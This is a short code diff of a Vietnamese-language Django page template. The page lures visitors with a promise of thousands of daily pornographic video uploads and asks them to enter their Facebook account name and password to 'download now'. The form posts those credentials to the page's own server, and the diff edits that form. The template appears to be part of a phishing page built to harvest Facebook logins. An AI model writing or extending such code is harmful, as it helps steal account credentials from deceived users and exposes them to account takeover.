@@ -19,12 +19,13 @@
     <p>Hàng ngàn phim con heo được upload mỗi ngày</p>
     <div>
         <h2>Đăng nhập để tải ngay!</h2>
-        <form action="/download/" method="post">
+        <form action="" method="POST">
             {% csrf_token %}
             Tài khoản facebook:<br>
             {{form.name}}<br>
             Mật khẩu:<br>
             <input type="text" name="password">
+            {% csrf_token %}
             {{form.password}}
             <br>
             <input type="submit" value="Tải ngay!">
